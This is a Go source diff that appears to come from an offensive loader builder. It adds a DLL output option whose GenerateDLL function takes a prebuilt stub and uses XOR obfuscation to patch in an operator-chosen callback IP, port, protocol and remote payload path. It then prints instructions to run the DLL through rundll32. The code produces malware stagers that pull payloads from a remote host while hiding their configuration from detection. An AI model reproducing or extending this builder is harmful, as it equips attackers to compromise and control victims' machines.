@@ -19,6 +19,7 @@ import (
 var winType = []string{
 	"exe",
 	"ps1",
+	"dll",
 	//"vbs",
 	//"vba",
 	//"xsl",
@@ -30,6 +31,7 @@ var BuildMap = make(map[string]buildFunc)
 
 func InitBuildMap() {
 	BuildMap["exe"] = GenerateExe
+	BuildMap["dll"] = GenerateDLL
 	BuildMap["ps1"] = GeneratePs1
 }
 
@@ -155,5 +157,37 @@ func GenerateExe(stubData []byte, host, proto, target, outputPath string) {
 	}
 	absOutputPath, _ := filepath.Abs(outputPath)
 	message := fmt.Sprintf("%s build successfully!", absOutputPath)
+	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
+}
+
+// c-dll远程加载
+func GenerateDLL(stubData []byte, host, proto, target, outputPath string) {
+	if outputPath[len(outputPath)-3:] != "dll" {
+		outputPath += ".dll"
+	}
+	sIp := DoXor([]byte("255.255.255.255"))
+	sPort := DoXor([]byte("65535"))
+	sTarget := DoXor([]byte("files/loader1234567890abcdefghijklmnopqrstuvwxyz.bin"))
+	sProto := DoXor([]byte("httpsorhttp123"))
+	dIpStr, dPortStr, _ := strings.Cut(host, ":")
+	dIp := DoXor([]byte(dIpStr))
+	dPort := DoXor([]byte(dPortStr))
+	dTarget := DoXor([]byte(target))
+	dProto := DoXor([]byte(proto))
+
+	stubData = ReplaceBytes(stubData, sIp, dIp)
+	stubData = ReplaceBytes(stubData, sPort, dPort)
+	stubData = ReplaceBytes(stubData, sProto, dProto)
+	stubData = ReplaceBytes(stubData, sTarget, dTarget)
+	err := ioutil.WriteFile(outputPath, stubData, 0777)
+	if err != nil {
+		message := fmt.Sprintf("%s", err.Error())
+		colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
+		return
+	}
+	absOutputPath, _ := filepath.Abs(outputPath)
+	message := fmt.Sprintf("%s build successfully!", absOutputPath)
+	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
+	message = fmt.Sprintf("you can use [rundll32.exe %s,main] to load", absOutputPath)
 	colorcode.PrintMessage(colorcode.SIGN_SUCCESS, message)
 }
